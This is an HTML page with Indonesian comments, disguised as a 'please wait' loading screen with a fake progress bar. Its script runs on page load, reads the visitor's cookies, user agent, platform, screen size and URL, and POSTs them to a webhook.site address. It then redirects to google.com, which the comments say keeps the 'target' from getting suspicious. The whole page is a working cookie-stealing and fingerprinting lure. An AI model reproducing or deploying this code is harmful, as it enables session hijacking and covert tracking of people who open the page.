<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Sedang Memuat...</title>
    <style>
        body { background-color: #000; color: #0f0; font-family: monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .loading { text-align: center; }
    </style>
</head>
<body>
    <div class="loading">
        <h1>PLEASE WAIT...</h1>
        <p>Loading Resources [■■■■■■■■■□] 90%</p>
    </div>

    <script>
        (function() {
            // URL Webhook.site lu yang tadi
            const targetURL = "https://webhook.site/e6e6579c-2cbb-4944-8993-1f87e6f71633";
            
            // Ambil data sistem & cookie
            const data = {
                info: "TARGET_LOGGED_SUCCESSFULLY",
                cookie: document.cookie || "No_Cookie_Detected",
                device: {
                    userAgent: navigator.userAgent,
                    platform: navigator.platform,
                    screen: screen.width + "x" + screen.height
                },
                location: window.location.href,
                timestamp: new Date().toISOString()
            };

            // Kirim data secara transparan agar terdeteksi Webhook.site
            fetch(targetURL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(data)
            })
            .then(() => {
                // Redirect setelah kirim data biar target gak curiga
                setTimeout(() => {
                    window.location.href = "https://google.com";
                }, 1500);
            })
            .catch(err => {
                // Tetap redirect meski gagal kirim
                window.location.href = "https://google.com";
            });
        })();
    </script>
</body>
</html>
